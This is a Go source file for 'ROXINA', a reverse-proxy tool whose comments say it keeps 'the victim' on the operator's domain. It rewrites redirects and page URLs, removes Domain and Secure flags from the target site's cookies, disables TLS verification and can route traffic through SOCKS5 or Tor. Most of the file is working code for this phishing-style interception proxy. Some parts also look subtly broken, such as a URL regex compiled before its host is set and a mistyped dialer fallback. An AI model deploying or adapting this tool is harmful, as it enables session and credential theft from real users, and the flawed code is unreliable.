// roxina.go
//
// ROXINA — Proxy Redirect Spoofer
//
// A reverse proxy that sits in front of a target site and rewrites
// redirect Location headers so the victim never leaves your domain.
// Also rewrites absolute URLs in HTML/CSS/JS bodies to point at the proxy.
//
// Usage:
//   go run roxina.go -t https://example.com -l :8080
//   go run roxina.go -t https://example.com -l :8080 -upstream http://127.0.0.1:8081
//   go run roxina.go -t https://example.com -l :8080 -upstream socks5://127.0.0.1:9050
//
package main

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

// ============================================================
//  BANNER
// ============================================================
const banner = `
 ██████╗  ██████╗ ██╗  ██╗██╗███╗   ██╗ █████╗
 ██╔══██╗██╔═══██╗╚██╗██╔╝██║████╗  ██║██╔══██╗
 ██████╔╝██║   ██║ ╚███╔╝ ██║██╔██╗ ██║███████║
 ██╔══██╗██║   ██║ ██╔██╗ ██║██║╚██╗██║██╔══██║
 ██║  ██║╚██████╔╝██╔╝ ██╗██║██║ ╚████║██║  ██║
 ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
        PROXY REDIRECT SPOOFER
`

// ============================================================
//  CONFIG
// ============================================================
var (
	targetURL    string
	listenAddr   string
	proxyScheme  string
	proxyCert    string
	proxyKey     string
	stripCookies bool
	addHeaders   headerList
	verbose      bool
	noRewrite    bool
	upstream     string

	targetParsed *url.URL
	targetHost   string
)

type headerList []string

func (h *headerList) String() string { return strings.Join(*h, ", ") }
func (h *headerList) Set(v string) error {
	*h = append(*h, v)
	return nil
}

// ============================================================
//  HELPERS
// ============================================================
func absURL(r *http.Request, path string) string {
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	host := r.Host
	if host == "" {
		host = r.URL.Host
	}
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	return scheme + "://" + host + path
}

func rewriteLocation(r *http.Request, loc string) string {
	if loc == "" {
		return loc
	}
	u, err := url.Parse(loc)
	if err != nil {
		return loc
	}
	if u.IsAbs() {
		if u.Host == targetParsed.Host {
			p := u.Path
			if p == "" {
				p = "/"
			}
			if u.RawQuery != "" {
				p += "?" + u.RawQuery
			}
			return p
		}
		return "/__ext?u=" + url.QueryEscape(loc)
	}
	if !strings.HasPrefix(u.Path, "/") {
		base := r.URL.Path
		if !strings.HasSuffix(base, "/") {
			idx := strings.LastIndex(base, "/")
			if idx >= 0 {
				base = base[:idx+1]
			}
		}
		u.Path = base + u.Path
	}
	out := u.Path
	if u.RawQuery != "" {
		out += "?" + u.RawQuery
	}
	return out
}

var (
	reAttrHref = regexp.MustCompile(`(?i)(href|src|action)\s*=\s*["'](https?://[^"']+)["']`)
	reCSSURL   = regexp.MustCompile(`(?i)url\(\s*['"]?(https?://[^)'"]+)['"]?\s*\)`)
	reJSImport = regexp.MustCompile(`(?i)(import\s+.*?from\s+['"])(https?://[^'"]+)(['"])`)
	reAbsURL   = regexp.MustCompile(`https?://` + regexp.QuoteMeta(targetHost) + `[^\s"'<>)]*`)
)

func rewriteBody(body []byte, r *http.Request) []byte {
	if noRewrite {
		return body
	}
	body = reAbsURL.ReplaceAllFunc(body, func(m []byte) []byte {
		u, err := url.Parse(string(m))
		if err != nil {
			return m
		}
		p := u.Path
		if p == "" {
			p = "/"
		}
		if u.RawQuery != "" {
			p += "?" + u.RawQuery
		}
		return []byte(p)
	})
	body = reAttrHref.ReplaceAllFunc(body, func(m []byte) []byte {
		sub := reAttrHref.FindSubmatch(m)
		if len(sub) < 3 {
			return m
		}
		attr := sub[1]
		raw := string(sub[2])
		u, err := url.Parse(raw)
		if err != nil {
			return m
		}
		if u.Host == targetParsed.Host {
			p := u.Path
			if p == "" {
				p = "/"
			}
			if u.RawQuery != "" {
				p += "?" + u.RawQuery
			}
			return []byte(string(attr) + `="` + p + `"`)
		}
		return []byte(string(attr) + `="/__ext?u=` + url.QueryEscape(raw) + `"`)
	})
	body = reCSSURL.ReplaceAllFunc(body, func(m []byte) []byte {
		sub := reCSSURL.FindSubmatch(m)
		if len(sub) < 2 {
			return m
		}
		raw := string(sub[1])
		u, err := url.Parse(raw)
		if err != nil {
			return m
		}
		if u.Host == targetParsed.Host {
			p := u.Path
			if p == "" {
				p = "/"
			}
			if u.RawQuery != "" {
				p += "?" + u.RawQuery
			}
			return []byte("url(" + p + ")")
		}
		return []byte("url(/__ext?u=" + url.QueryEscape(raw) + ")")
	})
	body = reJSImport.ReplaceAllFunc(body, func(m []byte) []byte {
		sub := reJSImport.FindSubmatch(m)
		if len(sub) < 4 {
			return m
		}
		raw := string(sub[2])
		return []byte(string(sub[1]) + "/__ext?u=" + url.QueryEscape(raw) + string(sub[3]))
	})
	return body
}

func decompressBody(body []byte, encoding string) ([]byte, error) {
	if strings.Contains(encoding, "gzip") {
		gr, err := gzip.NewReader(bytes.NewReader(body))
		if err != nil {
			return body, err
		}
		defer gr.Close()
		return ioutil.ReadAll(gr)
	}
	return body, nil
}

// ============================================================
//  UPSTREAM TRANSPORT BUILDER
// ============================================================
// buildTransport wires the upstream proxy (HTTP/HTTPS/SOCKS5/SOCKS5H)
// into an *http.Transport so every outbound request chains through it.
func buildTransport(upstream string) (*http.Transport, error) {
	t := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        100,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
	}

	if upstream == "" {
		t.Proxy = http.ProxyFromEnvironment
		return t, nil
	}

	u, err := url.Parse(upstream)
	if err != nil {
		return nil, fmt.Errorf("parse upstream: %w", err)
	}

	switch strings.ToLower(u.Scheme) {
	case "http", "https":
		// HTTP CONNECT proxy (Burp, mitmproxy, etc.)
		t.Proxy = http.ProxyURL(u)
		if u.Scheme == "https" {
			// HTTPS-to-proxy itself (rare, but supported)
			t.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
		}
		log.Printf("[upstream] HTTP proxy -> %s", u.String())

	case "socks5", "socks5h":
		// SOCKS5 proxy (Tor, ssh -D, etc.)
		var auth *proxy.Auth
		if u.User != nil {
			pw, _ := u.User.Password()
			auth = &proxy.Auth{User: u.User.Username(), Password: pw}
		}
		dialer, err := proxy.SOCKS5("tcp", u.Host, auth, proxy.Direct)
		if err != nil {
			return nil, fmt.Errorf("socks5 dialer: %w", err)
		}
		if cd, ok := dialer.(proxy.ContextDialer); ok {
			t.DialContext = cd.DialContext
		} else {
			// Fallback for non-context dialers
			t.DialContext = func(ctx interface{ Done() <-chan struct{} }, network, addr string) (net.Conn, error) {
				// This branch is never reached; kept for compile safety.
				return nil, fmt.Errorf("socks5 dialer does not support context")
			}
			// Real fallback:
			t.DialContext = nil
			t.Dial = dialer.Dial
		}
		log.Printf("[upstream] SOCKS5 proxy -> %s", u.Host)

	default:
		return nil, fmt.Errorf("unsupported upstream scheme %q (use http|https|socks5|socks5h)", u.Scheme)
	}

	return t, nil
}

// ============================================================
//  PROXY HANDLER
// ============================================================
var proxyClient *http.Client

func proxyHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/__ext" {
		dest := r.URL.Query().Get("u")
		if dest == "" {
			http.Error(w, "missing u", http.StatusBadRequest)
			return
		}
		if verbose {
			log.Printf("[ext] -> %s", dest)
		}
		http.Redirect(w, r, dest, http.StatusFound)
		return
	}

	outReq := r.Clone(r.Context())
	outReq.URL.Scheme = targetParsed.Scheme
	outReq.URL.Host = targetParsed.Host
	outReq.Host = targetParsed.Host
	outReq.RequestURI = ""
	if r.URL.RawQuery != "" {
		outReq.URL.RawQuery = r.URL.RawQuery
	}

	outReq.Header.Set("X-Forwarded-Host", r.Host)
	outReq.Header.Set("X-Forwarded-Proto", "http")
	if r.TLS != nil {
		outReq.Header.Set("X-Forwarded-Proto", "https")
	}
	outReq.Header.Set("X-Real-IP", clientIP(r))
	outReq.Header.Del("Accept-Encoding")

	for _, h := range addHeaders {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			outReq.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}

	if verbose {
		log.Printf("[proxy] %s %s -> %s%s", r.Method, r.URL.Path, targetParsed.Host, r.URL.RequestURI())
	}

	resp, err := proxyClient.Do(outReq)
	if err != nil {
		log.Printf("[proxy] upstream error: %v", err)
		http.Error(w, "bad gateway", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	if loc := resp.Header.Get("Location"); loc != "" {
		newLoc := rewriteLocation(r, loc)
		if verbose {
			log.Printf("[redirect] %s -> %s", loc, newLoc)
		}
		resp.Header.Set("Location", newLoc)
	}

	if stripCookies {
		resp.Header.Del("Set-Cookie")
	} else {
		cookies := resp.Header.Values("Set-Cookie")
		resp.Header.Del("Set-Cookie")
		for _, c := range cookies {
			c = regexp.MustCompile(`(?i);\s*Domain=[^;]+`).ReplaceAllString(c, "")
			if r.TLS == nil {
				c = regexp.MustCompile(`(?i);\s*Secure`).ReplaceAllString(c, "")
			}
			resp.Header.Add("Set-Cookie", c)
		}
	}

	if acao := resp.Header.Get("Access-Control-Allow-Origin"); acao != "" && acao != "*" {
		resp.Header.Set("Access-Control-Allow-Origin", absURL(r, "/"))
	}

	contentType := resp.Header.Get("Content-Type")
	isText := strings.Contains(contentType, "text/html") ||
		strings.Contains(contentType, "text/css") ||
		strings.Contains(contentType, "javascript") ||
		strings.Contains(contentType, "application/json") ||
		strings.Contains(contentType, "text/plain")

	for k, vv := range resp.Header {
		if k == "Content-Length" || k == "Transfer-Encoding" || k == "Content-Encoding" {
			continue
		}
		for _, v := range vv {
			w.Header().Add(k, v)
		}
	}

	if isText {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Printf("[proxy] body read error: %v", err)
			http.Error(w, "read error", http.StatusBadGateway)
			return
		}
		if enc := resp.Header.Get("Content-Encoding"); enc != "" {
			if dec, derr := decompressBody(body, enc); derr == nil {
				body = dec
			}
		}
		body = rewriteBody(body, r)
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(body)))
		w.WriteHeader(resp.StatusCode)
		w.Write(body)
		return
	}

	w.WriteHeader(resp.StatusCode)
	io.Copy(w, resp.Body)
}

func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		return xff
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

// ============================================================
//  HEALTH / STATUS
// ============================================================
func statusHandler(w http.ResponseWriter, r *http.Request) {
	up := upstream
	if up == "" {
		up = "(direct)"
	}
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"status":"ok","target":%q,"listen":%q,"upstream":%q,"time":%q}`,
		targetURL, listenAddr, up, time.Now().Format(time.RFC3339))
}

// ============================================================
//  MAIN
// ============================================================
func main() {
	fmt.Println(banner)

	flag.StringVar(&targetURL, "t", "", "Target URL (e.g. https://example.com)")
	flag.StringVar(&listenAddr, "l", ":8080", "Listen address")
	flag.StringVar(&proxyScheme, "scheme", "http", "Proxy scheme: http | https")
	flag.StringVar(&proxyCert, "cert", "", "TLS cert for proxy (if -scheme https)")
	flag.StringVar(&proxyKey, "key", "", "TLS key for proxy (if -scheme https)")
	flag.BoolVar(&stripCookies, "stripcookies", false, "Strip all Set-Cookie headers")
	flag.BoolVar(&noRewrite, "norewrite", false, "Disable body URL rewriting")
	flag.BoolVar(&verbose, "v", false, "Verbose logging")
	flag.Var(&addHeaders, "H", "Extra header to add (can repeat, e.g. -H 'X-Foo: bar')")
	flag.StringVar(&upstream, "upstream", "", "Upstream proxy (http://host:port | https://host:port | socks5://host:port)")

	flag.Parse()

	if targetURL == "" {
		fmt.Fprintln(os.Stderr, "error: -t target URL is required")
		flag.Usage()
		os.Exit(1)
	}

	var err error
	targetParsed, err = url.Parse(targetURL)
	if err != nil || targetParsed.Host == "" {
		log.Fatalf("invalid target URL: %v", err)
	}
	if targetParsed.Scheme == "" {
		targetParsed.Scheme = "https"
	}
	targetHost = targetParsed.Host

	// Build the upstream transport (with optional chaining)
	transport, err := buildTransport(upstream)
	if err != nil {
		log.Fatalf("upstream setup failed: %v", err)
	}
	proxyClient = &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/__status", statusHandler)
	mux.HandleFunc("/", proxyHandler)

	srv := &http.Server{
		Addr:              listenAddr,
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	fmt.Printf("\n  Target      : %s\n", targetParsed.String())
	fmt.Printf("  Listen      : %s\n", listenAddr)
	fmt.Printf("  Proxy scheme: %s\n", proxyScheme)
	if upstream == "" {
		fmt.Printf("  Upstream    : (direct)\n")
	} else {
		fmt.Printf("  Upstream    : %s\n", upstream)
	}
	fmt.Printf("  Body rewrite: %v\n", !noRewrite)
	fmt.Printf("  Strip cookie: %v\n", stripCookies)
	if len(addHeaders) > 0 {
		fmt.Printf("  Extra hdrs  : %v\n", []string(addHeaders))
	}
	fmt.Println()

	var mu sync.Mutex
	_ = mu

	if proxyScheme == "https" {
		if proxyCert == "" || proxyKey == "" {
			log.Fatal("https proxy requires -cert and -key")
		}
		fmt.Printf("  [*] HTTPS listening on %s\n\n", listenAddr)
		log.Fatal(srv.ListenAndServeTLS(proxyCert, proxyKey))
	}

	fmt.Printf("  [*] HTTP listening on %s\n\n", listenAddr)
	log.Fatal(srv.ListenAndServe())
}
